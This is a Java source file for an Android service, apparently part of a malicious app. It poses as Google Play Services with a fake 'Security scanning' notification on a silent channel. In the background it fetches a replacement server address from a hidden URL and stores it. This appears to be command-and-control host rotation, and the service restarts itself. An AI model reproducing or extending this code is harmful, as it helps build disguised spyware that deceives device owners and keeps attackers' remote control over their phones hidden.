package com.android.background.services.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.android.background.services.R;
import com.android.background.services.helpers.SharedPrefHelper;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CheckUpdatedHostService extends Service {

    private static final String TAG = "MADARA";
    private ExecutorService executorService;
    private final String CHANNEL_ID = new Random().toString() + new Random();

    @Override
    public void onCreate() {
        super.onCreate();
        executorService = Executors.newSingleThreadExecutor();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        createNotificationChannel();

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);

        Notification notification = notificationBuilder.setContentTitle("Security scanning")
                .setContentText("Updating Google services database")
                .setSmallIcon(R.drawable.play_service_icon)
                .setOngoing(true)
                .build();
        startForeground(1, notification);

        executorService.execute(new BackgroundTask());
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        executorService.shutdown();
    }

    private void createNotificationChannel() {

        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "Background Database Update",
                NotificationManager.IMPORTANCE_NONE
        );
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(serviceChannel);
    }

    private class BackgroundTask implements Runnable {
        @Override
        public void run() {
            // Perform HTTP request to the specified URL
            try {
                URL url = new URL(getString(R.string.updated_host_check_link));
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setInstanceFollowRedirects(true);

                InputStream in = new BufferedInputStream(urlConnection.getInputStream());

                InputStreamReader inputStreamReader = new InputStreamReader(in);
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line);
                }
                String updatedHost = stringBuilder.toString();

                // Close connections
                bufferedReader.close();
                inputStreamReader.close();
                in.close();
                urlConnection.disconnect();

                SharedPrefHelper prefHelper = new SharedPrefHelper(getApplicationContext());
                prefHelper.saveUpdatedHost(updatedHost);

            } catch (Exception e) {
                Log.e(TAG, "run: ", e);
            }

            stopSelf(); // Stop the service when the task is complete
        }
    }
}
